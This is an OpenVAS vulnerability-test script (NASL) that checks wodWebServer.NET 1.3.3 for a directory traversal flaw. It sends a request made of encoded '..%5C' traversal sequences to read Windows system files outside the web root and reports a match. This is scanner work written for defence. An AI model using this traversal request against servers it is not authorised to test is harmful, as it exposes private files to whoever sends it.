###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wodWebServer_1_3_3.nasl 12063 2018-10-24 14:21:54Z cfischer $
#
# wodWebServer.NET 1.3.3 Directory Traversal
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103131");
  script_version("$Revision: 12063 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-24 16:21:54 +0200 (Wed, 24 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-03-28 13:42:17 +0200 (Mon, 28 Mar 2011)");
  script_bugtraq_id(47050); #nb: The BID is listing CVE-2010-3743 but that one is for a different product.
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("wodWebServer.NET 1.3.3 Directory Traversal");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wodWebServer/banner");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17053/");

  script_tag(name:"summary", value:"A directory traversal vulnerability in wodWebServer.NET can be
  exploited to read files outside of the web root.");

  script_tag(name:"affected", value:"wodWebServer.NET 1.3.3 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

port = get_http_port( default:80 );
banner = get_http_banner( port:port );
if( ! banner || "wodWebServer" >!< banner ) exit( 0 );

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  file = str_replace( find:"/", string:file, replace:"%5C/" );
  url = string( "/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/", file );

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );